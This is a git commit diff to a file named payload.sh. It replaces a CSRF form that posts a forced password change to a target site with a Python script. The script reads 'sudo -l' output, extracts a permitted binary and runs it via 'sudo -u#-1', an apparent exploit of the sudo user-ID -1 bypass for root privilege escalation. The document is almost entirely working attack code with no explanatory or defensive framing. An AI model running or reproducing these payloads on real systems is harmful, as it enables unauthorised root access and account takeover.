2afccbae4b9ff1a0bb2f181cf4d2159b94618133
envoybughunter <envoybughunter@gmail.com>
2025-07-01 18:18:07 +0300

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,9 +1,25 @@
-#!/bin/bash
+#!/usr/bin/python3
 
-<form action="http://target.com/change-password" method="POST">
-  <input type="hidden" name="password" value="hacked123">
-  <input type="submit">
-</form>
+import os
+
+#Get current username
+
+username = input("Enter current username :")
 
 
+#check which binary the user can run with sudo
 
+os.system("sudo -l > priv")
+
+
+os.system("cat priv | grep 'ALL' | cut -d ')' -f 2 > binary")
+
+binary_file = open("binary")
+
+binary= binary_file.read()
+
+#execute sudo exploit
+
+print("Lets hope it works")
+
+os.system("sudo -u#-1 "+ binary)
